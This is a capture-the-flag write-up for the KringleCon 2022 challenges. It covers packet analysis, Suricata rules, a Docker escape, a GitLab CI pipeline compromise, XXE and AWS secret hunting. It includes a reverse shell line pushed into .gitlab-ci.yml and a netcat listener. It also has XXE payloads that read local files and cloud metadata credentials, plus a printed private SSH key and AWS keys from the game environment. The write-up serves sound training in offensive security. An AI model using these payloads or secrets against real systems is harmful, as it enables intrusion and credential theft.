# KringleCon 2022 Report
## Tolkien Ring
### Wireshark Practice
1.
- So the most common object is http, so i tried and... yeah.
- Answer: `http`
2. 
- Wireshark -> File -> Export Objects -> HTTP...
- We can see here that the biggest file is the app.php file..
- Answer: `app.php`
3.
- Wireshark -> File -> Export Objects -> HTTP...
- We can also see here the packet number.
- Answer: `687`
4.
- Wireshark -> File -> Export Objects -> HTTP...
- If we click on the app.php, wireshark will display the packet, and we can see in the source the IP.
- Answer: `192.185.57.242`
5.
- Wireshark -> File -> Export Objects -> HTTP... -> app.php (The larger one) -> Save
- If we explore the app.php file we can see in the javascript function that it save a file from the blob to the host with the following file name.
- Answer: `Ref_Sept24-2020.zip`
6.
- We can set the following filter to wireshark `tls.handshake.type == 2` for filtering the "Server Hello".
- Wireshark -> Edit -> Find Packet...
- We set the filter to `Packet Details`, check the `Case sensitive`, `String` and the searched string is `CountryName:`.
- If we click on the find button again and again, we can see all the country codes (US, IL, SS).
- We can go for example to https://countrycode.org/ and search for the country codes we found.
- Answer: `United States, Israel, South Sudan`
7.
- I think so.
- Answer: `Yes`

### Windows Event Logs
- This one is little bit harder so i will just say the answers, it's good to work with the actual Windows Event Log app.
1.
- Answer: `12/24/2022`
2.
- Answer: `Recipe.txt`
3.
- Answer: `$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'}`
4.
- Answer: `$foo | Add-Content -Path 'Recipe'`
5.
- Answer: `Recipe.txt`
6.
- Answer: `Yes`
7.
- Answer: `No`
8.
- Answer: `4104`
9.
- Answer: `Yes`
10.
- Answer: `honey`

### Suricata Regatta
- Documentation: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html
1.
- So first we need to catch the DNS lookups for this `adv.epostoday.uk`.
- Add `alert dns any any -> any any (msg:"Known bad DNS lookup, possible Dridex infection"; dns.query; content:"adv.epostoday.uk"; nocase; sid:1;)` to the `suricata.rules` file.

2.
- Ok, now we need to create a rule that catch the http communication between this IP `192.185.57.242` and with their "internal system", the `$HOME_NET`.
- We can find the `$HOME_NET` in the already set configurations.
- We need to catch the communication from both sides, thats why are going to use this `<>`.
- Add `alert http 192.185.57.242 any <> $HOME_NET any (msg:"Investigate suspicious connections, possible Dridex infection";sid:2;)` to the `suricata.rules` file.

3.
- Cool, now we need to add a rule that catch TLS certificates with a specific CN.
- Add `alert tls any any <> any any (msg:"Investigate bad certificates, possible Dridex infection";tls.subject:"CN=heardbellith.Icanwepeh.nagoya"; sid:3;)` to the `suricata.rules` file.

4.
- I know, the GZip thing sound kinda scary but if look in the documentation, we can see that the `http.response_body` already look for strings in possible gzips.
- Add `alert http any any -> any any (http.response_body;msg:"Suspicious JavaScript function, possible Dridex infection";content:"let byteCharacters = atob"; sid:4;)` to the `suricata.rules` file.

## Elfen Ring
### Clone with a Difference
- Basicly we just need to clone from this `git@haugfactory.com:asnowball/aws_scripts.git` gitlab repo.
- I just converted the ssh clone thing to https like this `https://haugfactory.com/asnowball/aws_scripts.git`.
- Now we can clone it `git clone https://haugfactory.com/asnowball/aws_scripts.git`.
- We can change the directory `cd aws_scripts`, and cat the `README.md` file.
- The last word there is `maintainers`.
- Just type this word in the `runtoanswer`.

### Prison Escape
- So i just find this guide on the *HackTricks* website [Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounting-disk-poc1).
- If we do `sudo -l`, we can see we are already root.
- So we can check if there are any disks attached with the `sudo fisk -l` command.
- We can see here the `/dev/vda` disk, so we can just mount it `sudo mkdir -p /mnt/hola;sudo mount /dev/vda /mnt/hola`.
- We successfully mount the disk we can navigate to it `cd /mnt/hola` and find the flag `cat home/jailer/.ssh/jail.key.priv`.
- Yeee `082bb339ec19de4935867`.

### Jolly CI/CD
- Ok, so first things first this challange need realy some time to bake.
- In the meantime, you might have noticed that *Tinsel Upatree* leaked the git repository.
- I know it's stupid, but you can watch it (the 10 means the reload time in seconds) `watch -n 10 "git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git"`.
- Once you see *Updating files* stuff you are ready to go. Just remove the repo `rm -f -r wordpress.flag.net.internal` and clone it again properly `git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git`. Then you can navigete to it of course `cd wordpress.flag.net.internal`.
- This challange wants us to do some stuff with github. So we can automaticly just do the `git log` command.
- Ooh and this log *whoops* looks interesting. We can just do the `git show e19f653bde9ea3de6af21a587e41e7a909db1ca5`.
- And we found a ssh key. Dont forget to delete the *-* in each line.
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----


```
- We can store it in a file. I don't like when the file is in the repository, so i just put it in the directory above with `nano ../id_rsa`. Dont forget the extra line on the end.
- Now we must give the standard permissions to the *id_rsa* file with `chmod 600 ../id_rsa`.
- Next step we must create a reverse shell to gitlab.
- So we include the reverse shell in the `.gitlab-ci.yml`. This file will run our reverse shell after pushing the repo.
- Just add a extra *-* line with the reverse shell under the existing one.
```
- sh -i >& /dev/tcp/172.18.0.99/4545 0>&1
```
- Next step we must stage the updated *.gitlab-ci.yml* file and commit it.
```bash
git add --all;git config --global user.name "foo";git commit -m "foo"
```
- Now we can start the *netcat* listener.
```bash
nc -lvnp 4545
```
- We can background it with Crtl-Z (*^Z*).
- Now we need to configure github to use the ssh key and not the token. So just export this variable.
```bash
export GIT_SSH_COMMAND='ssh -i /home/samways/id_rsa'
```
- Cool, now we can push it.
```bash
git push git@gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git
```
- Now we cant wait for the reverse shell. Unbackground the netcat listener with `fg`.
- *Connection from 172.18.1.149 60740 received!* Y000000
- If you noticed in the *.gitlab-ci.yml* file, there was also a ssh command with some ssh key `ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy` so we can try to connect to it (the flag is on the wordress target not the gitlab so we haven't won yet).
```
ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy wordpress.flag.net.internal
```
- The flag is in the */* folder.
```bash
cat /flag.txt
```
- Flag: `oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT`

## Web Ring
### Naughty IP
- Unzip the zip file and open wireshark on the *victim.pcap* file.
- Wireshark -> Statistics -> Conversations
- Click twice on the *Packets* to order the items by the number of packets.
- And yep, one ip has *16603* packets.
- Answer: `18.222.86.32`

### Credential Mining
- So we can just filter the ip we found above in wireshark with the `ip.addr == 18.222.86.32` filter.
- We can add a *http* filter `ip.addr == 18.222.86.32 && http`.
- If we scroll a bit you can see the login post requests.
- Right click on the first one, Follow > HTTP Stream and **boom**.
- Answer: `alice`.

### 404 FTW
- Just apply this filter in wireshark to filter out just the communication with the target server, get request and show the http responses.
```
ip.addr == 18.222.86.32 && ip.src == 10.12.42.16 && http.request.method == GET || http.response
```
- If you scroll a bit you can see the *NOT FOUND* things. Thats the bruteforce attack.
- Find the first one with *200 OK (text/html)*, Follow > HTTP Stream.
- Answer: `/proc`

### IMDS, XXE, and Other Abbreviations
- This one is easier, *XXE Attacks* are related to xml. So we gonna just filter *xml* in wireshark.
```
ip.addr == 18.222.86.32 && xml
```
- Right click on the last packet, Follow > HTTP Stream.
- We can see here the payload `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"> ]>\n<product><productId>&id;</productId></product>`.
- Answer: `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`.

### Open Boria Mine Door
- We just need to complete 3 of them.
- Ok, letters are boring so let's try *XSS*.
```
<style>body {background-color: white;}</style>
```
- Cool, now we can do this thing in the next two steps. Only the third box *background-color* doesn't work, so we'll use svg.
1. Answer: `<style>body {background-color: white;}</style>`
2. Answer: `<style>body {background-color: white;}</style>`
3. Answer: `<svg><rect width="300" height="400" fill="blue" /></svg>`

### Glamtariel's Fountain
- So let's first talk about what we are up against, because the pages look quite chaotic at first glance.
- We have a princess and fountain here.
- In the top right corner we have four "conversations" that we can drag to one of them and they will tell us some information about that "topic".
- Drag one of the conversations to one of them and notice in the developer tools, in the *Network* tab (I use Google Chrome), a post request to */dropped* in this format:
```json
{
   "imgDrop":"img1",
   "who":"princess",
   "reqType":"json"
}
```
- One of the hints says that the early parts of this challenge can be solved by focusing on Glamtariel's WORDS.
- So let's write all those WORDS first. You have to drag and drop each theme onto each of them. If you don't, you will get the "Zoom, Zoom, very hasty" response in the later parts of the challenge, directly use the burp browser or proxy, whichever suits you better. Send one of the requests to the repeater with CTRL-R and just turn *Intercept off*.
- Yes and also send one of the requests to the repeater with CTRL-R
```
TAMPER
PATH
APP
TYPE
RINGLIST
SIMPLE FORMAT
```
- So the first suspicious thing is that we can enter other request types in the post request, that's weird.
- That means we can try *XXE* attack using xml.
- So let's change the request to xml using [this online converter](https://www.convertjson.com/json-to-xml.htm).
```xml
POST /dropped HTTP/2
Host: glamtarielsfountain.com
Cookie: MiniLembanh=Your cookie; GCLB="Your cookie"
Content-Length: Your length
Accept: application/json
X-Grinchum: Your cookie
Content-Type: application/xml
Sec-Ch-Ua-Platform: "Linux"
Origin: https://glamtarielsfountain.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://glamtarielsfountain.com/
Accept-Encoding: gzip, deflate

<?xml version="1.0" encoding="UTF-8" ?>
<root>
  <imgDrop>img2</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```
- Don't forget to change *Content-Type* and *<reqType>* to xml.
- The response should look like this:
```json
{
  "appResp": "I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
  "droppedOn": "none",
  "visit": "none"
}
```
- Let's put some payload here. [Hacktricks XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file).
- I *ehm ehm... figured* the path using the WORDS we wrote above, the website structure and file extension using the *SIMPLE FORMAT* hint. Yeah... that's just it.
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt"> ]>
<root>
  <imgDrop>&xxe;</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```
- The response should look like this:
```json
{
  "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
  "droppedOn": "none",
  "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
}
```
- Let's look at the image.
- You must open the image in your browser with burp (Your cookies). If you don't, you will see "*We're sorry. Please contact a moderator.*" image.
- The picture tells us the name of the folder (*x_phial_pholder_2022*) and the two files that belong to it (*bluering.txt*, *redring.txt*). Let's open them.
- bluering.txt (Request):
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt"> ]>
<root>
  <imgDrop>&xxe;</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```
- bluering.txt (Response):
```json
{
  "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
  "droppedOn": "none",
  "visit": "none"
}
```
- redring.txt (Response):
```json
{
  "appResp": "Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.",
  "droppedOn": "none",
  "visit": "none"
}
```
- In the browser we can also see the silver ring let's try it.
- silverring.txt (Request):
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt"> ]>
<root>
  <imgDrop>&xxe;</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```
- silverring.txt (Response):
```json
{
  "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
}
```
- Let's visit the image. We got the name of the next file (*goldring_to_be_deleted.txt*).
- goldring_to_be_deleted.txt (Request):
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt"> ]>
<root>
  <imgDrop>&xxe;</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```
- goldring_to_be_deleted.txt (Response):
```json
{
  "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
  "droppedOn": "none",
  "visit": "none"
}
```
- Ok, so let's try putting the payload in the *<reqType>* and replace *<imgDrop>* with *img1*.
- Request:
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt"> ]>
<root>
  <imgDrop>img1</imgDrop>
  <who>princess</who>
  <reqType>&xxe;</reqType>
</root>
```
- Response:
```json
{
  "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
}
```
- Let's visit the image. And... we won!!!
- Answer: `goldring-morethansupertopsecret76394734.png`

## Cloud Ring
### AWS CLI Intro
1. *You may not know this, but AWS CLI help messages are very easy to access.*
- Answer: Just type `aws help` and then `q` to exit.
2. *Next, please configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY, the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1.*
- They immediately give us a [link](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config) where they show that we can simply set it up with a command `aws configure`.
- Answer: Type `aws configure`, then type `AKQAAYRKO7A5Q5XUY2IY`, then type `qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf`, then type `us-east-1`, for the *output format* just choose `json` just like in the example.
3. *To finish, please get your caller identity using the AWS command line.*
- So, if we *google around* we find that we find out by command `aws sts get-caller-identity` [Documentation](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html).
- Answer: `aws sts get-caller-identity`

### Trufflehog Search
- So we have to find out some credentials in github repo (*https://haugfactory.com/asnowball/aws_scripts.git*) using tool *trufflehog*.
- Let's find out what it can do:
```bash
trufflehog git https://haugfactory.com/asnowball/aws_scripts.git
```
- Output:
```bash
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

Found unverified result 🐷🔑❓
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAAIDAYRANYAHGQOHD
Commit: 106d33e1ffd53eea753c1365eafc6588398279b5
File: put_policy.py
Email: asnowball <alabaster@northpolechristmastown.local>
Repository: https://haugfactory.com/asnowball/aws_scripts.git
Timestamp: 2022-09-07 07:53:12 -0700 -0700
Line: 6

Found unverified result 🐷🔑❓
Detector Type: Gitlab
Decoder Type: PLAIN
Raw result: add-a-file-using-the-
Timestamp: 2022-09-06 19:54:48 +0000 UTC
Line: 14
Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85
File: README.md
Email: alabaster snowball <alabaster@northpolechristmastown.local>
Repository: https://haugfactory.com/asnowball/aws_scripts.git

Found unverified result 🐷🔑❓
Detector Type: Gitlab
Decoder Type: BASE64
Raw result: add-a-file-using-the-
Repository: https://haugfactory.com/asnowball/aws_scripts.git
Timestamp: 2022-09-06 19:54:48 +0000 UTC
Line: 14
Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85
File: README.md
Email: alabaster snowball <alabaster@northpolechristmastown.local>
```
- It found some credentials in the *put_policy.py* file.
- We can clone the repo, checkout that commit and see what is in that file.
```console
elf@5f7babb2b521:~$ git clone https://haugfactory.com/asnowball/aws_scripts.git
Cloning into 'aws_scripts'...
remote: Enumerating objects: 64, done.
remote: Total 64 (delta 0), reused 0 (delta 0), pack-reused 64
Unpacking objects: 100% (64/64), 23.83 KiB | 1.32 MiB/s, done.
elf@5f7babb2b521:~$ cd aws_scripts/
elf@5f7babb2b521:~/aws_scripts$ git checkout 106d33e1ffd53eea753c1365eafc6588398279b5
Note: switching to '106d33e1ffd53eea753c1365eafc6588398279b5'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 106d33e added
elf@5f7babb2b521:~/aws_scripts$ cat put_policy.py 
import boto3
import json


iam = boto3.client('iam',
    region_name='us-east-1',
    aws_access_key_id="AKIAAIDAYRANYAHGQOHD",
    aws_secret_access_key="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",
)
# arn:aws:ec2:us-east-1:accountid:instance/*
response = iam.put_user_policy(
    PolicyDocument='{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["ssm:SendCommand"],"Resource":["arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5","arn:aws:ec2:us-east-1:748127089694:document/RestartServices"]}]}',
    PolicyName='AllAccessPolicy',
    UserName='nwt8_test',
)
```
- Cool, we found some credentials. Let's configure them with `aws configure`.
```console
elf@5f7babb2b521:~/aws_scripts$ aws configure
AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: json
```